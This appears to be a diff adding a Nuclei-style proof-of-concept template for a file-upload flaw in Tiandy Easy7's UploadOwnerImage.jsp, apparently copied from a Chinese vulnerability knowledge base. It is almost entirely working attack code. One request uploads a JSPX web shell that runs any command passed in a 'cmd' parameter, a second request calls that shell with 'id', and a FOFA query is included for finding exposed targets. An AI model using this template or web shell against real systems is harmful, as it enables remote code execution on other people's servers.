@@ -1,0 +1,70 @@
+id: poc-5501180365
+info:
+  name: 天地伟业Easy7 UploadOwnerImage存在文件上传漏洞_nx6ml28xlfug8vcp
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'POST /Easy7/apps/WebService/UploadOwnerImage.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+
+    Content-Disposition: form-data; name="file";filename="qaxnb.jspx"
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1">
+
+    <jsp:directive.page contentType="text/plain" pageEncoding="UTF-8"/>
+
+    <jsp:directive.page import="java.io.*"/>
+
+    <jsp:scriptlet><![CDATA[
+
+    String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l);}}
+
+    ]]></jsp:scriptlet>
+
+    </jsp:root>
+
+    ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1776660905111-986a77e7-0cec-4a60-91fe-d89552b897bf.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Easy7/images/uploadPics/1776260609342_1.jspx?cmd=id HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
